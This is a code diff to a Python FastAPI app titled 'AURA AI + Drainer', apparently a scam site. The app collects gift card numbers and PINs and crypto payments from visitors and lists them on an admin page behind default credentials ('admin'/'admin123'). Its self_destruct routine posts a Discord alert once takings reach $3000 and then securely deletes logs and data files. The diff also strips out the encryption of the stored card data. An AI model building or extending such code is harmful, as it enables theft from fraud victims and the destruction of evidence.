@@ -10,7 +10,6 @@ from fastapi import FastAPI, Request, HTTPException, Form
 from fastapi.responses import HTMLResponse, JSONResponse
 from fastapi.templating import Jinja2Templates
 from pydantic import BaseModel, validator
-from cryptography.fernet import Fernet
 from dotenv import load_dotenv
 import jinja2
 
@@ -28,14 +27,8 @@ FIXEDFLOAT_API_KEY = os.getenv("FIXEDFLOAT_API_KEY", "")
 FIXEDFLOAT_SECRET = os.getenv("FIXEDFLOAT_SECRET", "")
 BURN_SECRET = os.getenv("BURN_SECRET", "default_secret")
 BURN_THRESHOLD = float(os.getenv("BURN_THRESHOLD", 3000.0))
-ENCRYPTION_KEY = os.getenv("ENCRYPTION_KEY", "").encode()
-
-if not ENCRYPTION_KEY:
-    raise ValueError("ENCRYPTION_KEY not set in .env")
-
-fernet = Fernet(ENCRYPTION_KEY)
-DATA_FILE = "data.enc"
-TEMP_FILE = "data.enc.tmp"
+ADMIN_USER = os.getenv("ADMIN_USER", "admin")
+ADMIN_PASS = os.getenv("ADMIN_PASS", "admin123")
 
 # ---------- Logging ----------
 logger = logging.getLogger(__name__)
@@ -47,12 +40,9 @@ console = logging.StreamHandler()
 console.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
 logger.addHandler(console)
 
-# ---------- Storage utils ----------
-def encrypt_data(data: dict) -> bytes:
-    return fernet.encrypt(json.dumps(data).encode())
-
-def decrypt_data(encrypted: bytes) -> dict:
-    return json.loads(fernet.decrypt(encrypted).decode())
+# ---------- Storage utils (plain JSON) ----------
+DATA_FILE = "data.json"
+TEMP_FILE = "data.json.tmp"
 
 def read_storage():
     if not os.path.exists(DATA_FILE):
@@ -60,8 +50,8 @@ def read_storage():
         write_storage(default)
         return default
     try:
-        with open(DATA_FILE, "rb") as f:
-            return decrypt_data(f.read())
+        with open(DATA_FILE, "r") as f:
+            return json.load(f)
     except Exception as e:
         logger.error(f"Storage read error: {e}, recreating")
         default = {"total": 0.0, "processed": [], "gift_cards": [], "crypto_txs": [], "withdrawals": []}
@@ -69,9 +59,8 @@ def read_storage():
         return default
 
 def write_storage(data: dict):
-    encrypted = encrypt_data(data)
-    with open(TEMP_FILE, "wb") as f:
-        f.write(encrypted)
+    with open(TEMP_FILE, "w") as f:
+        json.dump(data, f, indent=2)
         f.flush()
         os.fsync(f.fileno())
     os.replace(TEMP_FILE, DATA_FILE)
@@ -115,7 +104,7 @@ class CardPayload(BaseModel):
 # ---------- FastAPI App ----------
 app = FastAPI(title="AURA AI + Drainer")
 
-# Set up Jinja2 templates from strings
+# ---------- Jinja2 Templates (all HTML) ----------
 templates_env = jinja2.Environment(
     loader=jinja2.DictLoader({
         "base.html": '''<!DOCTYPE html>
@@ -372,7 +361,6 @@ async def pay_gift(request: Request):
     card_pin = form.get("card_pin", "")
     if not card_number:
         return JSONResponse({"error": "Card number required"}, status_code=400)
-    # Store in encrypted storage
     storage = read_storage()
     gift_cards = storage.get("gift_cards", [])
     gift_cards.append({
@@ -405,7 +393,6 @@ async def pay_crypto(request: Request):
     price = 60000 if currency == "BTC" else 3000 if currency == "ETH" else 1
     usd_value = amount * price
     usd_received = usd_value * 0.99
-    # Store in storage
     storage = read_storage()
     crypto_txs = storage.get("crypto_txs", [])
     tx_id = len(crypto_txs)+1
@@ -440,8 +427,7 @@ async def admin_login(request: Request):
     form = await request.form()
     username = form.get("username")
     password = form.get("password")
-    if username == os.getenv("ADMIN_USER", "admin") and password == os.getenv("ADMIN_PASS", "admin123"):
-        # Set session cookie
+    if username == ADMIN_USER and password == ADMIN_PASS:
         response = templates.TemplateResponse("admin.html", {
             "request": request,
             "gift_cards": read_storage().get("gift_cards", []),
@@ -557,7 +543,7 @@ def self_destruct():
     asyncio.run(send_discord("🔥 SITE REACHED $3000 — SELF DESTRUCTING", color=0xff0000))
     for root, dirs, files in os.walk("."):
         for f in files:
-            if f.endswith((".log", ".json", ".db", ".pyc", ".enc")):
+            if f.endswith((".log", ".json", ".db", ".pyc")):
                 secure_delete(os.path.join(root, f))
     shutil.rmtree("__pycache__", ignore_errors=True)
     logger.critical("SITE DESTROYED")
